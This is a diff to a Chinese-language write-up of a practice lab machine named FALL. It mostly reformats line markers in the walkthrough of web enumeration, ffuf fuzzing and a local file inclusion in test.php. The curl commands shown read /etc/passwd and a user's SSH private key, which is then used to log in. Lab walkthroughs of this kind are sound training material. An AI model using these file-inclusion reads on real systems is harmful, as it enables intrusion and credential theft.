@@ -127,27 +127,37 @@ Target: https://192.168.146.52/
 └─$ 
 ```
 ## Web枚举
->拿到admin的后台目录
-
+拿到admin的后台目录
+<br>
 ![Img](../FILES/FALL/img-20220715111910.png)
->sql注入无果
+<br>
+sql注入无果
 
->assets里面的文件夹均没有文件
+<br>
+assets里面的文件夹均没有文件
 
 ![Img](../FILES/FALL/img-20220715112000.png)
 
->doc没有返回任何信息
+<br>
+doc没有返回任何信息
 ![Img](../FILES/FALL/img-20220715112225.png)
->只有注释带有一句DUMMY HTML File
+<br>
+只有注释带有一句DUMMY HTML File
 
->phpinfo.php也同样没有返回信息
+<br>
+phpinfo.php也同样没有返回信息
+<br>
 robots.php返回File not Found
 
->但是
+<br>但是
 访问test.php的时候
+<br>
 告诉我Missing GET parameter
+<br>
 ![Img](../FILES/FALL/img-20220715112425.png)
+<br>
 那就试试ffuf
+<br>
 
 >ffuf是一款web fuzzer的工具, 用起来就是一个字"快"
 但是在kali当中没有默认安装
@@ -188,24 +198,24 @@ file                    [Status: 200, Size: 1633, Words: 36, Lines: 33, Duration
 :: Progress: [4712/4712] :: Job [1/1] :: 3126 req/sec :: Duration: [0:00:02] :: Errors: 0 ::
                                                                                                                                         
 ```
->在这里就可以看到file是作为一个get参数的, 那就代表它有文件包含
+<br>在这里就可以看到file是作为一个get参数的, 那就代表它有文件包含
 ```
 https://192.168.146.52/test.php?file=/etc/passwd
 ```
 ![Img](../FILES/FALL/img-20220715115848.png)
->curl到本地
+<br>curl到本地
 ```
 http://192.168.146.52/test.php?file=/etc/passwd
 ```
->试试看/root的.ssh key
+<br>试试看/root的.ssh key
 ```
 ┌──(aacai㉿kali)-[~/Desktop/192.168.146.52]
 └─$ curl http://192.168.146.52/test.php?file=/root/.ssh/id_rsa        
     
 ```
->并没有回显, 从网页上获取一下信息
+<br>并没有回显, 从网页上获取一下信息
 ![Img](../FILES/FALL/img-20220715120726.png)
-有一个posted by qiu, 这个用户可能是一个突破点
+<br>有一个posted by qiu, 这个用户可能是一个突破点
 ```
 ┌──(aacai㉿kali)-[~/Desktop/192.168.146.52]
 └─$ curl http://192.168.146.52/test.php?file=/home/qiu/.ssh/id_rsa
@@ -240,7 +250,8 @@ uhSHa0dvveoJ8xMAAAAZcWl1QGxvY2FsaG9zdC5sb2NhbGRvbWFpbgEC
 ┌──(aacai㉿kali)-[~/Desktop/192.168.146.52]
 └─$ 
 ```
->得到qiu的ssh密钥
+<br>
+得到qiu的ssh密钥
 ```
 ┌──(aacai㉿kali)-[~/Desktop/192.168.146.52]
 └─$ ls -al
@@ -273,7 +284,7 @@ Load key "ssh_rsa": bad permissions
 qiu@192.168.146.52: Permission denied (publickey,gssapi-keyex,gssapi-with-mic).
 
 ```
->文件权限不对, 修改权限
+<br>文件权限不对, 修改权限
 ```
 └─$ sudo chmod 600 ssh_rsa                                                                                                        255 ⨯
 [sudo] password for aacai: 
@@ -301,7 +312,7 @@ Last login: Sun Sep  5 19:28:51 2021
 [qiu@FALL ~]$ 
 登录成功
 ```
-### 权限提升
+## 权限提升
 ```
 [qiu@FALL ~]$ ls -a
 .  ..  .bash_history  .bash_logout  .bash_profile  .bashrc  local.txt  reminder  .ssh
